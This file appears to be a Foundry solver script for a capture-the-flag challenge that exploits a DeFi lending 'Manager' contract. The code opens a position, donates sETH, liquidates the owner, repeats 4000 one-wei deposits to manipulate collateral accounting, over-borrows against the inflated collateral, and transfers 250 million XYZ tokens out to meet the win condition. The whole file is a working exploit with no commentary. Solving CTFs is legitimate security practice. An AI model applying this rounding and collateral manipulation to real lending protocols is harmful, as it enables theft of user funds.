// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

import "forge-ctf/CTFSolver.sol";
import "src/Challenge.sol";
import "forge-std/console.sol";
import {ERC20Signal} from "src/ERC20Signal.sol";
import {PriceFeed} from "src/PriceFeed.sol";
import {IERC20} from "openzeppelin/token/ERC20/IERC20.sol";

contract Solve is CTFSolver {
    function solve(address challenge_, address player) internal override {
        Challenge challenge = Challenge(challenge_);

        console.log("solved?", challenge.isSolved());

        Token sETH = challenge.seth();
        Manager manager = challenge.manager();
        Token XYZ = challenge.xyz();

        (ERC20Signal collateralToken, ERC20Signal debtToken, PriceFeed feed,,) =
            manager.collateralData(IERC20(address(sETH)));

        XYZ.approve(address(manager), type(uint256).max);
        sETH.approve(address(manager), type(uint256).max);

        manager.manage(sETH, 3 ether, true, 3530 ether, true);

        sETH.transfer(address(manager), sETH.balanceOf(player));
        manager.liquidate(manager.owner());

        for (uint256 i; i < 4000; i++) {
            manager.manage(sETH, 1, true, 0, true);
        }

        uint256 collateralChange = sETH.balanceOf(address(manager));
        manager.manage(sETH, collateralChange, false, 0, true);

        uint256 collateralAmount = collateralToken.balanceOf(player);
        (uint256 price,) = feed.fetchPrice();
        uint256 debtChange = collateralAmount * (price / 1e18) * 100 / 130 - debtToken.balanceOf(player);
        manager.manage(sETH, 0, true, debtChange, true);

        XYZ.transfer(address(0xCAFEBABE), 250_000_000 ether);

        console.log("solved?", challenge.isSolved());
    }
}
